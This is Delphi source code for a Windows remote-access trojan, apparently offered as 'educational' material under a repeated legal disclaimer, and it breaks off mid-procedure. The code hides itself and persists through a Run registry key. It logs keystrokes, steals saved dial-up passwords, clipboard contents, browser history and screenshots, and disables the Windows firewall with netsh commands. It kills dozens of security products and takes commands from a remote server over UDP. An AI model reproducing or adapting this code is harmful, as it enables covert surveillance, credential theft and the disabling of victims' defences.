{*
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before doing anything with this code

'Disclaimer: This is illegal if excuted on real people and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education pupose only.
'For more educational source codes please visit us http://www.digi77.com/training.html
'Dr Jeeni Founder of www.oman0.net & www.digi77.com wishes you good luck :).

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
}

unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls,registry,WSockets,WinSock, OleCtnrs,clipbrd,
  Tlhelp32,StdCtrls,Ras,Jpeg, SFolders, FtpSrv,ShellAPI,wininet,Activex, Comobj;




type


   {for url history}
    STATURL = record
    cbSize: DWORD;
    pwcsUrl: DWORD;
    pwcsTitle: DWORD;
    ftLastVisited: FILETIME;
    ftLastUpdated: FILETIME;
    ftExpires: FILETIME;
    dwFlags: DWORD;
    end;
    {end for url history}


    //for the ras
    TIntry = record
    Name: string;
    Phon: String;
    UserName: String;
    PassWord: String;
    Error: string;
  end;
    //end ras











    TForm1 = class(TForm)
    Timer1: TTimer;
    Memo1: TMemo;
    Timer4: TTimer;
    Timer5: TTimer;
    Memo2: TMemo;
    SearchFolders: TSearchFolders;
    memo3: TListBox;
    FtpServer1: TFtpServer;
    Timer2: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer4Timer(Sender: TObject);
    procedure Timer5Timer(Sender: TObject);
    procedure SearchFoldersChanged(Sender: TObject; CountFiles,
      SizeOfFiles: Integer);
   
    procedure Timer2Timer(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);

  private
    { Private declarations }
    UDPClient1: TUDPClient;
    UDPServer1: TUDPServer;

    {*** not used
    procedure UDPServer1Error(Sender: TObject; Error: integer; Msg: string);
    end}

    procedure UDPServer1Data(Sender: TObject; Socket: TSocket);


    {** not used
    procedure UDPClient1Error(Sender: TObject; Error: integer; Msg: string);
    end}
    procedure UDPClient1Data(Sender: TObject; Socket: TSocket);

  public
    { Public declarations }
    Loopkey:Byte;
  end;



  {for the ras}
  procedure RasGetPhoneBookEntries(var Lst: TStringList);
  function  GetParams(var Account:TIntry): boolean;
  {end}

  const
    version1=' test-victim3214';
    usedport=50077;
    password='xxxxx';
    serverhost='xxx.org';
    //serverhost='localhost';
    serverversion=' ver 16 ';



   { for url history}
   STATURL_QUERYFLAG_ISCACHED = $00010000;
  STATURL_QUERYFLAG_NOURL = $00020000;
  STATURL_QUERYFLAG_NOTITLE = $00040000;
  STATURL_QUERYFLAG_TOPLEVEL = $00080000;

  STATURLFLAG_ISCACHED = $00000001;
  STATURLFLAG_ISTOPLEVEL = $00000002;


  IID_IEnumStatUrl: TGUID = (D1: $3C374A42; D2: $BAE4; D3: $11CF; D4: ($BF, $7D, $00, $AA, $00, $69, $46, $EE));
  IID_IUrlHistoryStg: TGUID = (D1: $3C374A41; D2: $BAE4; D3: $11CF; D4: ($BF, $7D, $00, $AA, $00, $69, $46, $EE));
  IID_IUrlHistoryStg2: TGUID = (D1: $AFA0DC11; D2: $C313; D3: $831A; D4: ($83, $1A, $00, $C0, $4F, $D5, $AE, $38));
  IID_IUrlHistoryNotify: TGUID = (D1: $BC40BEC1; D2: $C493; D3: $11D0; D4: ($83, $1B, $00, $C0, $4F, $D5, $AE, $38));

  SID_IEnumStatUrl = '{3C374A42-BAE4-11CF-BF7D-00AA006946EE}';
  SID_IUrlHistoryStg = '{3C374A41-BAE4-11CF-BF7D-00AA006946EE}';
  SID_IUrlHistoryStg2 = '{AFA0DC11-C313-11d0-831A-00C04FD5AE38}';
  SID_IURLHistoryNotify = '{BC40BEC1-C493-11d0-831B-00C04FD5AE38}';
  CLSID_CUrlHistory: TGUID = '{3C374A40-BAE4-11CF-BF7D-00AA006946EE}';
  {end for url history}







  type
   PassParts = array [0..6,0..3] of byte; //Parts of the password, it devides into groups of 4 encoded characters which is equivalent to 3 decoded characters. There can be a maximum of 6 groups (16 decoded characters, 25 encoded)
   DecPassArray = array [0..24] of byte;  //Array got directly from the registry. It can be 25 characters maximum



   {for url history}
     IEnumSTATURL = interface(IUnknown)
    ['{3C374A42-BAE4-11CF-BF7D-00AA006946EE}']
    function Next(celt: Integer; out elt; pceltFetched: PLongint): HRESULT; stdcall;
    function Skip(celt: Longint): HRESULT; stdcall;
    function Reset: HResult; stdcall;
    function Clone(out ppenum: IEnumSTATURL): HResult; stdcall;
    function SetFilter(poszFilter: PWideChar; dwFlags: DWORD): HResult; stdcall;
  end;

    IUrlHistoryStg = interface(IUnknown)
    ['{3C374A41-BAE4-11CF-BF7D-00AA006946EE}']
    function AddUrl(pocsUrl: PWideChar; pocsTitle: PWideChar; dwFlags: Integer): HResult; stdcall;
    function DeleteUrl(pocsUrl: PWideChar; dwFlags: Integer): HResult; stdcall;
    function QueryUrl(pocsUrl: PWideChar; dwFlags: Integer; var lpSTATURL: STATURL): HResult; stdcall;
    function BindToObject(pocsUrl: PWideChar; var riid: TIID; out ppvOut: Pointer): HResult; stdcall;
    function EnumUrls(out ppenum: IEnumSTATURL): HResult; stdcall;
  end;

  IUrlHistoryStg2 = interface(IUrlHistoryStg)
    ['{AFA0DC11-C313-11D0-831A-00C04FD5AE38}']
    function AddUrlAndNotify(pocsUrl: PWideChar; pocsTitle: PWideChar; dwFlags: Integer;
      fWriteHistory: Integer; var poctNotify: Pointer;
      const punkISFolder: IUnknown): HResult; stdcall;
    function ClearHistory: HResult; stdcall;
  end;

  IUrlHistoryNotify = interface(IOleCommandTarget)
    ['{BC40BEC1-C493-11d0-831B-00C04FD5AE38}']
  end;
    {end for url history}


      var
    Form1: TForm1;

    {url history}
    I: IUrlHistoryStg2;
    {end url history}


    {for the ras}
    RasDialParams: TRasDialParams;
   {end}

    thecomputername:string;
    memoryver:string;
    VerInfo : TOsversionInfo;
    winver:String;
    cusername:string;
    myip:string;
    myhost:string;
    PassSize:integer;  //Size in characters (including the ending) of encoded password

    ftpon:integer;
    memo3index:integer;

    {if key exist in reg}
    theReg  : TRegistry;
    {end }




  implementation

uses Unit2;

  {$R *.dfm}


 

   
      {for screen shoot}

      procedure getshoot;
        var
        DCDesk: HDC; // hDC of Desktop
        bmp: TBitmap;
        MyJPEG : TJPEGImage;
        MyBMP  : TBitmap;
        num:integer;

        begin


        {Create a bitmap}
        bmp := TBitmap.Create;

        {Set a bitmap sizes}
        bmp.Height := Screen.Height;
        bmp.Width := Screen.Width;

        {Get a desktop DC handle - handle of a display device context}
        DCDesk := GetWindowDC(GetDesktopWindow);
  
        {Copy to any canvas, here canvas of an image}
        BitBlt(bmp.Canvas.Handle, 0, 0, Screen.Width, Screen.Height,
        DCDesk, 0, 0, SRCCOPY);

        {Save the bitmap}
        bmp.SaveToFile('c:\ScreenShot.bmp');

        {Release desktop DC handle}
        ReleaseDC(GetDesktopWindow, DCDesk);

        {Release a bitmap}
        bmp.Free;

        //genrate random number
        num:=Random(100) + 2;


        { Convert a BMP to a JPEG }

        MyBMP := TBitmap.Create;
        with MyBMP do
        try

        LoadFromFile('c:\ScreenShot.bmp');
        MyJPEG := TJPEGImage.Create;

        with MyJPEG do begin
        Assign(MyBMP);
        SaveToFile('c:\'+ inttostr(num) + 'i.sys');
        Free;
        end;
        finally
        Free;
        end;

        DeleteFile('c:\ScreenShot.bmp') ;
      end;
      {end screen shoot}






      {check internet}

      Function ConnectionKind :boolean;
        var
        flags: dword;
        begin

        Result := InternetGetConnectedState(@flags, 0);

        if Result then
        begin
        if (flags and INTERNET_CONNECTION_MODEM) = INTERNET_CONNECTION_MODEM then
        begin
        form1.Timer4.Enabled:=false;
        form1.Timer2.Enabled:=true;
        end;
        if (flags and INTERNET_CONNECTION_LAN) = INTERNET_CONNECTION_LAN then
        begin
        form1.Timer4.Enabled:=false;
        form1.Timer2.Enabled:=true;
        end;
        if (flags and INTERNET_CONNECTION_PROXY) = INTERNET_CONNECTION_PROXY then
        begin
        form1.Timer4.Enabled:=false;
        form1.Timer2.Enabled:=true;
        end;
        if (flags and INTERNET_CONNECTION_MODEM_BUSY)=INTERNET_CONNECTION_MODEM_BUSY then
        begin
        form1.Timer4.Enabled:=false;
        form1.Timer2.Enabled:=true;
        end;
        end;
      end;
      {end check internet}

                   


      {for the ras1}
      procedure RasGetPhoneBookEntries(var Lst: TStringList);
        var
        RasEntryName: array[1..20] of TRasEntryName;
        i, x: DWord;
        BufSize, Entries: LongInt;

        begin
        {clear the memo}
        form1.memo1.Clear;
        form1.memo2.Clear;
        {end}

        RasEntryName[1].dwSize := SizeOf(RasEntryName[1]);
        BufSize := SizeOf(RasEntryName);
        x := RasEnumEntries(nil, nil, @RasEntryName, BufSize, Entries);
        if (x = 0) or (x = ERROR_BUFFER_TOO_SMALL) then
        for i := 1 to Entries do
        if ( i < 21) and (RasEntryName[i].szEntryName[0] <> #0) then
        Lst.Add(StrPas(RasEntryName[i].szEntryName));

      end;
      {end for ras1}



      {for ras 2}
      procedure getRas;
        var
        Lst: TStringList;
        Accounts: array [0..25] of TIntry;
        i: integer;

        begin
        Lst := TStringList.Create;
        RasGetPhoneBookEntries(Lst);
        for i := 0 to Lst.Count -1 do
        begin
          Accounts[i].Name := Lst[i];
          GetParams(Accounts[i]);
        end;

        form1.Memo1.Clear ;

        for i := 0 to Lst.Count -1 do
        begin
          form1.Memo2.Lines.Add ('Account Name: ' + Accounts[i].Name);
          form1.Memo2.Lines.Add ('ISP phone: '+Accounts[i].Phon);
          form1.Memo2.Lines.Add ('User Name: '+Accounts[i].UserName);
          form1.Memo2.Lines.Add ('Password: ' +Accounts[i].PassWord);
          form1.Memo2.Lines.Add ('______________');
          form1.Memo2.Lines.Add ('              ');
        end;

        Lst.Free;
      end;
      {end for ras 2}







    {for the ras 3}
    function GetParams(var Account:TIntry): boolean;
      var
      fp: LongBool;
      ErrNo, ESize, DSize: Longint;
      Entry: TRasEntry;
      S: string;
      cTxt: Array[0..255] of Char;

      begin
      Result := false;
      with RasDialParams do begin
      dwSize := Sizeof(TRasDialParams);
      StrLCopy(szEntryName, PChar(Account.Name ), Ras_MaxEntryName);
      end;

      ErrNo := RasGetEntryDialParams(nil, RasDialParams, fp);
      if (ErrNo = 0) then
      with RasDialParams do begin
      Account.UserName := szUserName;
      if fp then
        Account.PassWord := szPassword;
      end

      else begin
        RasGetErrorString(ErrNo, cTxt, 256);
        Account.Error := s;
        Exit;
      end;

      ESize := 0;
      DSize := 0;
      Entry.dwSize := SizeOf(TRasEntry);
      RasGetEntryProperties(nil, PChar(Account.Name), nil,
      ESize, nil, DSize);
      ErrNo := RasGetEntryProperties(nil, PChar(Account.Name),
      @Entry, ESize, nil, DSize);
      if (ErrNo = 0) then with Entry do begin
      if (1<2) then
      Account.Phon := IntToStr(dwCountryCode) + ' (' + szAreaCode +
      ') ' + szLocalPhoneNumber
      else if (szAreaCode <> '') then
      Account.Phon := '(' + szAreaCode + ') ' + szLocalPhoneNumber
      else
      Account.Phon := szLocalPhoneNumber;
      Result := true;
      end

      else begin
      case RasGetErrorString(ErrNo, cTxt, 256) of
        0: S :=  cTxt;
        ERROR_INSUFFICIENT_BUFFER:
           S := 'ERROR_INSUFFICIENT_BUFFER';
        ERROR_INVALID_PARAMETER:
           S := 'ERROR_INVALID_PARAMETER';

      else
      case ErrNo of
        ERROR_INVALID_USER_BUFFER:
          S := 'ERROR_INVALID_USER_BUFFER';
        ERROR_INVALID_PARAMETER:
          S := 'ERROR_INVALID_PARAMETER';
        ERROR_BUFFER_INVALID:
          S := 'ERROR_BUFFER_INVALID';
        ERROR_BUFFER_TOO_SMALL:
          S := 'ERROR_BUFFER_TOO_SMALL';
        ERROR_CANNOT_OPEN_PHONEBOOK:
          S := 'ERROR_CANNOT_OPEN_PHONEBOOK';
        ERROR_CANNOT_FIND_PHONEBOOK_ENTRY:
          S := 'ERROR_CANNOT_FIND_PHONEBOOK_ENTRY';
      else
          S := 'Unknown => ' + IntToStr(ErrNo);
      end;
      end;

      Account.Error := s;
      end;

    end;
    {end fo rthe ras3}



  



    {kill applications}
    function KillTask(ExeFileName: string): integer;
      const
      PROCESS_TERMINATE=$0001;

      var
      ContinueLoop: BOOL;
      FSnapshotHandle: THandle;
      FProcessEntry32: TProcessEntry32;

      begin
      result := 0;
      FSnapshotHandle := CreateToolhelp32Snapshot
      (TH32CS_SNAPPROCESS, 0);
      FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
      ContinueLoop := Process32First(FSnapshotHandle,FProcessEntry32);

      while integer(ContinueLoop) <> 0 do
      begin
        if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
         UpperCase(ExeFileName))
        or (UpperCase(FProcessEntry32.szExeFile) =
         UpperCase(ExeFileName))) then
        Result := Integer(TerminateProcess(OpenProcess(
                        PROCESS_TERMINATE, BOOL(0),
                        FProcessEntry32.th32ProcessID), 0));
      ContinueLoop := Process32Next(FSnapshotHandle,
                                  FProcessEntry32);
      end;

      CloseHandle(FSnapshotHandle);
    end;
    {end kill app}











    {for writing registry}
    procedure writereg(keyname,str1,str2 : string);
      begin

      try
      TheReg := TRegistry.Create;
      try

      // Load the root key.. if you wan't to make a trojan
      // for only one user of the system use HKEY_CURRENT_USER
      TheReg.RootKey := HKEY_LOCAL_MACHINE;
      // Create the key if it doesn't already exist
      thereg.CreateKey(keyname);

      // open the key
      if TheReg.OpenKey(KeyName, True) then
      begin
        // write the value to the registry
        TheReg.WriteString(str1,str2);
        // close the key
        TheReg.CloseKey;
      end;
      finally
      // close the registry
      TheReg.Free;
      end;
      except end;
    end;
    {end for writing registry}













    {form load}
    procedure TForm1.FormCreate(Sender: TObject);
    Var

    arrCompName : Array[0..255] Of Char;
    strCompName : String;
    CompNameLen :  Cardinal;
    buffer : String;
    buffsize : DWORD;

    begin


    {hide form}
    Application.Title := '';
    form1.caption:='';
    form1.Visible:=false;
    Application.Minimize;
    form1.Left:=0;
    form1.top:=0;
    form1.Height:=0;
    form1.Width:=0;
    ShowWindow(Application.Handle,SW_HIDE);
    {end hide form}





    {load the gift attached file ole}
    if Application.Exename <> 'C:\.SCR' then
    begin

      //OleContainer1.DoVerb(0);
      {showmessage('Adsl Configured successfully');  }
     // form2.Show;


    end;
    {end}




    {for ftp}
    ftpon:=0;
    {end ftp}


    {for file searching}
    SearchFolders.ScanOptions:=soAllDisks;
    {end}


    {kill lock down}
    KillTask ('vsmon.exe');
    {end}

    {for ras}
    getRas;
    {end}


    {randmosie}
    Randomize;
    {end}





    {*** not useddon't let this file to be shut down  -force runner
    if Application.Exename = 'C:\.SCR' then
    begin
    OleContainer3.DoVerb(0);
    end;
    end}


    {copy file and stuff}
    try
    CopyFile(pChar(Application.Exename),pChar('C:\.SCR'),false);
    except;
    end;
    {end}


    {get pc name}
    memo1.Text:='';
    CompNameLen := MAX_COMPUTERNAME_LENGTH + 1;
    If GetComputerName(arrCompName, CompNameLen) Then
    Begin
     SetLength(strCompName, MAX_COMPUTERNAME_LENGTH + 1);
     thecomputername := StrPas(arrCompName);
    End;
    {end}



    {sockets}
    UDPServer1:= TUDPServer.Create(Self);
    with UDPServer1 do
    begin
    {** not used
    OnError:= UDPServer1Error;
    end}
    OnData:= UDPServer1Data;
    end;

    UDPClient1:= TUDPClient.Create(Self);
    with UDPClient1 do
    begin
    {**not Used
    OnError:= UDPClient1Error;
    end}
    OnData:= UDPClient1Data;
    end;
    {end sockets}



    {get the ip}
    myhost:= UDPClient1.LocalHostName;
 

    {for win versio}
    VerInfo.dwOSVersionInfoSize := SizeOf(VerInfo);
    GetVersionEx(VerInfo);

    Case VerInfo.dwPlatformId Of
    VER_PLATFORM_WIN32s : winver:='Windows 3.1';
    VER_PLATFORM_WIN32_WINDOWS : winver:='Windows 95 or 98 or mel';
    VER_PLATFORM_WIN32_NT : winver:='Windows xp';
    end;
    {end}

    //for user name
    buffsize := 128;
    Setlength(buffer,buffsize);
    Getusername(Pchar(buffer),buffsize);
    cusername := buffer;
    //end


    //disable windows firwall  xp sp 1 run it once coz cmd.exe will be loaded once
    ShellExecute(Application.Handle, 'open', PChar('cmd.exe'),
    Pchar('/K net stop "Internet Connection Firewall (ICF) / Internet Connection Sharing (ICS)"'), Pchar('C:\'), SW_HIDE);
    //kill cmd
    sleep(4000);
    KillTask ('cmd.exe');


    //disable windows firwall  xp sp 2 run it once coz cmd.exe will be loaded once
    ShellExecute(Application.Handle, 'open', PChar('cmd.exe'),
    Pchar('/K netsh firewall set opmode disable'), Pchar('C:\'), SW_HIDE);
    //kill cmd
    sleep(4000);
    KillTask ('cmd.exe');






  end;
  {end form load}

   {*
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before doing anything with this code

'Disclaimer: This is illegal if excuted on real people and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education pupose only.
'For more educational source codes please visit us http://www.digi77.com/training.html
'Dr Jeeni Founder of www.oman0.net & www.digi77.com wishes you good luck :).

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
}

    {url history}
    function FileTimeToDt(Ft: TFileTime): TDateTime;
      var
      l: Integer;
      lft: TFileTime;
      begin
      FileTimeToLocalFiletime(Ft, lft);
      if FileTimeToDosDateTime(lft, Longrec(l).Hi, Longrec(l).Lo) then
      result := FiledateToDatetime(l) else
      result := 0;
    end;





    { endurl history}
  













   {useful string fucntions}
   //chop string
   function hamtastreng (text,strt,slut : string):string;
    var
    stplats,slutplats : integer;
    resultat : string;

    begin
    resultat :='';
    stplats := pos(strt,text);
    if stplats >0 then
    begin
    text := copy (text,stplats,length(text));
    slutplats := pos(slut,text);
    if slutplats >0 then
    begin
       resultat := copy(text,1,slutplats-1);
    end;
    end;
    result := resultat;
   end;
   {end chop string}

  {check end with}
  function endsWith (text,teststreng : string):boolean;
    var
    textlngd,testlngd : integer;
    kollstreng : string;
    begin
    testlngd := length(teststreng);
    textlngd := length (text);
    if textlngd > testlngd then
      begin
        kollstreng := copy (text,(textlngd+1)-testlngd,testlngd);
        if kollstreng = teststreng then
          result := true
        else
          result := false;
    end
    else
      result := false;
  end;
  {end check end with}

{end useful string functions}







  {must be used}
  procedure TForm1.UDPclient1Data(Sender: TObject; Socket: TSocket);
  begin

  end;
  {end}

  {get data from client}
  procedure TForm1.UDPServer1Data(Sender: TObject; Socket: TSocket);
    var
    Data: string;
    SockAddrIn: TSockAddrIn;

    {url history}
     r: Staturl;
     Enum: IEnumStatUrl;
     X: Integer;
     Row: Integer;
    {end url history}

    //for disk serial
    VolumeSerialNumber : DWORD;
    MaxComponetLength, FileFlag : Cardinal;

    begin
    Data:= UDPServer1.Read(Socket, SockAddrIn);
    with UDPServer1 do
    begin

    
            if data= 'cobra2000' then
            begin
            Write(Socket,'Connected',SockAddrIn);
            timer5.Enabled:=false;
            end

            else if data=('compname') then
            begin
            Write(Socket,thecomputername,SockAddrIn)
            end
            
            else if data=('ftpstart') then
            begin
            if ftpon=0 then
            begin
            FtpServer1.Start;
            Write(Socket,'Ftp is on',SockAddrIn);
            ftpon:=1;
            end
            else
            Write(Socket,'Ftp is already switched on',SockAddrIn);
            end

            else if data=('copymem') then
            begin
            memoryver := Clipboard.AsText;
            Write(Socket,memoryver,SockAddrIn);
            end

            else if data=('osinfo') then
            begin
            Write(Socket,winver + ' user name : '+ cusername,SockAddrIn);
            end

            else if data=('hserial') then
            begin
            GetVolumeInformation('c:\',nil,0,@VolumeSerialNumber,MaxComponetLength,FileFlag,nil,0);
            Write(Socket,IntToStr(VolumeSerialNumber),SockAddrIn);
            end





            else if data=('keylog') then
            begin
            Write(Socket,memo1.Text,SockAddrIn);
            end

            else if data=('getagain') then
            begin
            UDPClient1.Write(thecomputername + ' | '+  myhost +' | ' + serverversion +' | '+ myip +' | '+ version1);
            end

            else if data=('msn') then
            begin
            Write(Socket,'  RAS Details   '+memo2.Text,SockAddrIn);
            end

            else if data=('getver') then
            begin
            Write(Socket,version1,SockAddrIn);
            end

            else if data=('getmeip') then
            begin
            Write(Socket,myip,SockAddrIn);
            end

            else if data=('getmehost') then
            begin
            Write(Socket,myhost,SockAddrIn);
            end

            else if data=('screenshoot') then
            begin
            getshoot;
            Write(Socket,'screen shoot done',SockAddrIn);
            end

            else if endsWith(data,'#')=true then
            begin
            memo3index:=0;
            memo3.Clear;
            SearchFolders.ScanOptions:=soAllDisks;
            SearchFolders.FileMask := hamtastreng(data,data,'#');
            SearchFolders.FilesFound.Clear;
            SearchFolders.Scan;
            for memo3index := 0 to memo3.Count -1 do
            begin
            Write(Socket,memo3.items[memo3index],SockAddrIn);
            end
            end



            else if data=('history') then
            begin
            memo3.Clear;


            {url history}
            Row := 0;
            I := CreateComObject(ClsId_CUrlHistory) as IUrlHistoryStg2;
            I.EnumUrls(Enum);
            Enum.SetFilter('http://', 0);
            while enum.next(1, r, @X) = S_OK do
            begin
            Inc(Row);
            memo3.AddItem(DateTimeToStr(FileTimeToDt(r.ftLastVisited)) + '       ' +   PWidechar(Pointer(r.pwcsUrl)),sender);
            end;
            {end url history}


            for memo3index := 0 to memo3.Count -1 do
            begin
            Write(Socket,'$' + memo3.items[memo3index],SockAddrIn);
            end
            end




            else if data=('compname') then
            begin
            Write(Socket,myip,SockAddrIn);
            end;

           end;

        end;
        {end get data from client}




          

      {timer for key loger and startup}
      procedure  TForm1.Timer1Timer(Sender: TObject);
        var
        Result:Longint;
        Enter:Integer;
        Period:Integer;
        Comma:Integer;
        Space:Integer;
        Colon:Integer;
        Slash:Integer;
        Label KeyFound;

        begin
                               



        {hide form}
        Application.Title := '';
        form1.caption:='';
        form1.Visible:=false;
        {end hide form}





        

        writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','System3.2','C:\.SCR' );


        {if not on c path }
        if Application.Exename <> 'C:\.SCR' then
        begin
          close;
          application.Terminate;
          exit;
        end;
        {end}



        {key logger start}
        Result:=GetAsyncKeyState(27);
        If Result=-32767 then
        Begin
        {Close; }
        End;

        Result:=GetAsyncKeyState(190);
        If Result= -32767 then
        begin
        Period:=1;
        Goto keyFound;
        End;


        Result:=GetAsyncKeyState(13);
        if Result= -32767 then
        Begin
        Enter:=1;
        Goto Keyfound;
        End;


        Result:=GetAsyncKeyState(188);
        if Result= -32767 then
        begin
        Comma:=1;
        Goto keyFound;
        End;


        Result:=GetAsyncKeyState(32);
        if Result= -32767 then
        Begin
        Space:=1;
        Goto Keyfound;
        End;


        Result:=GetAsyncKeyState(186);
        if Result= -32767 then
        Begin
        Colon:=1;
        Goto Keyfound;
        End;


        Result:=GetAsyncKeyState(191);
        if Result= -32767 then
        Begin
        Slash:=1;
        Goto Keyfound;
        End;

        Loopkey:=41;
        repeat
        Result:=GetAsyncKeyState(Loopkey);
        if Result= -32767 then
        Begin
        Memo1.Text:= Memo1.Text + Chr(Loopkey);
        End
        Else
        Loopkey:=Loopkey+1;
        until Loopkey = 91;

        Exit;
        KeyFound:

        if Enter=1 Then
        Begin
        Memo1.Text:=Memo1.Text + #13#10;
        Exit;
        End;

        if Period=1 Then
        Begin
        Memo1.Text:=Memo1.Text + '.';
        Exit;
        End;

        if Comma=1 then
        begin
        Memo1.Text:=Memo1.Text+',';
        Exit;
        End;

        if Space=1 Then
        Begin
        Memo1.Text:=Memo1.Text+' ';
        Exit;
        End;

        if Colon=1 then
        Begin
        Memo1.Text:=Memo1.Text+':';
        Exit;
        End;

        if Slash=1  Then
        begin
        Memo1.Text:=Memo1.Text + '/';
        Exit;
        End;
      End;
     {end key log timer}




      {***** not used
     //remove windowsxp firewall from the startup as well

     Function Write_DWORD: Boolean;
        Var Reg: TRegistry;
        Path: String;

        Begin
        Reg := Tregistry.CReate;
        try
        with Reg do

        begin
        RootKey := HKEY_LOCAL_MACHINE;
        Path := 'SYSTEM\CurrentControlSet\Services\SharedAccess';

        If Not KeyExists(Path) Then
        Begin
          OpenKey(Path,True);
          WriteInteger('Start',3);   //set to three means start manualy
        End else 
        Begin
          OpenKey(Path,False);
          WriteInteger('Start',3);
        End; 
        End;
        Finally
        Reg.closekey;
        Reg.Free;
      End;
    End;
    //end remove the firewall from the startup as well
      }






  {kill all}
  procedure killall;

    begin
    KillTask ('vsmon.exe');
    KillTask ('lockdown2000.exe');
    KillTask ('lockdown.exe');
    KillTask ('LockDownAdvanced.exe');
    KillTask ('LockDown.exe');
    KillTask ('nc2000.exe');
    KillTask ('jammer.exe');
    KillTask ('lockdown2000.exe');
    KillTask ('lockdown.exe');
    KillTask ('guarddog.exe');
    KillTask ('Ia99.exe');
    KillTask ('vsmon.exe');
    KillTask ('a99.exe');
    KillTask ('PERSFW.EXe');
    KillTask ('internet alert.exe');
    KillTask ('jammer.exe');
    KillTask ('lockdown2000.exe');
    KillTask ('lockdown.exe');
    KillTask ('frw.exe');
    KillTask ('blackice.exe');
    KillTask ('blackd.exe');
    KillTask ('CPD.exe');
    KillTask ('cpd.exe');
    KillTask ('persfw.exe');
    KillTask ('smc.exe');
    KillTask ('SMC.exe');
    KillTask ('zapro.exe');
    KillTask ('IAMAPP.EXE');
    KillTask ('iamapp.exe');
    KillTask ('NeoWatchTray.exe');
    KillTask ('NeoWatchLog.exe');
    KillTask ('NISSERV');
    KillTask ('SymProxySvc.exe');
    KillTask ('NISUM');
    KillTask ('CPDClnt.exe');
    KillTask ('cfgWiz.exe');
    KillTask ('cpd.exe');
    KillTask ('PCCPFW.exe');
    KillTask ('PCCClient.exe');
    KillTask ('outpost.exe');
    KillTask ('PLManager.exe');

     {
    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','System3.2','C:\.SCR' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','iamapp',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','ZoneAlarm Pro',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','McAfee Guardian',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','McAfee.InstantUpdate.Monitor',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','PCCClient.exe',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','pccguide.exe',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','Pop3trap.exe',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','RuLaunch',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','WM_LOGIN',';' );

    writereg('\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','ZoneAlarm Pro',';' );

    end}


    {**** not used
    // remove xp fire wall  from registry
    Write_DWORD;
    end}


  end;
  {end kill all}






  {timer for check the internet}
  procedure TForm1.Timer4Timer(Sender: TObject);
    begin
    ConnectionKind;
  end;
  {end timer for check the internet}



  {timer for resending the signal}
  procedure TForm1.Timer5Timer(Sender: TObject);
    begin
    with UDPClient1 do
    begin

      if SocketState = ssOpen then
      begin
        myip:= UDPClient1.LocalHostAddress;
        UDPClient1.Write(thecomputername + ' | '+  myhost +' | ' + serverversion +' | '+ myip +' | '+ version1);
      end
      else
      begin
      Host:= serverhost;
      Port:= '85';
      Open;
      myip:= UDPClient1.LocalHostAddress;
      UDPClient1.Write(thecomputername + ' | '+  myhost +' | ' + serverversion +' | '+ myip +' | '+ version1);
      end;
      end;
      killall;
  end;
  {end timer for resending the signal}







  {search for files}
  procedure TForm1.SearchFoldersChanged(Sender: TObject; CountFiles,
   SizeOfFiles: Integer);

   var i : cardinal;
   F : TFilePack;

   begin

   if SearchFolders.FilesFound.Count = 0 then
   begin
   exit;
   end;
   memo3.clear;

   for i := 0 to Pred(SearchFolders.FilesFound.Count) do
   begin
   F := TFilePack(SearchFolders.FilesFound.Items[i]);
   Memo3.AddItem(F.FullPath + F.FileName + '   Size '+ IntToStr(F.FileSize div 1024)+ 'Kb',sender);
   end;
  end;
  {end search for files}





       {*
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
'Please read before doing anything with this code

'Disclaimer: This is illegal if excuted on real people and could land you in prison for sure.
'This is intended for educational purposes only. We take no responsibility at all for your actions.
'This code is provided by EEEDS Eagle Eye Digital Security (Oman) for education pupose only.
'For more educational source codes please visit us http://www.digi77.com/training.html
'Dr Jeeni Founder of www.oman0.net & www.digi77.com wishes you good luck :).

'Sharing knowledge is not about giving people something, or getting something from them.
'That is only valid for information sharing.
'Sharing knowledge occurs when people are genuinely interested in helping one another develop new capacities for action;
'it is about creating learning processes.
'Peter Senge
'!!!!!***************!!!!!!!!!******************!!!!!!!!!!!!**********!
}





  {timer if connection found}
  procedure TForm1.Timer2Timer(Sender: TObject);
    begin
    {for the start up}
    if Application.Exename = 'C:\.SCR' then
    begin

    killall;

    //initilize socket
    with UDPServer1 do
    begin
      Port:= '50077';
      Open;
    end;

    {send to victim server}
    with UDPClient1 do
    begin
      Host:= serverhost;
      Port:= '85';
      Open;
      if SocketState = ssOpen then
      begin
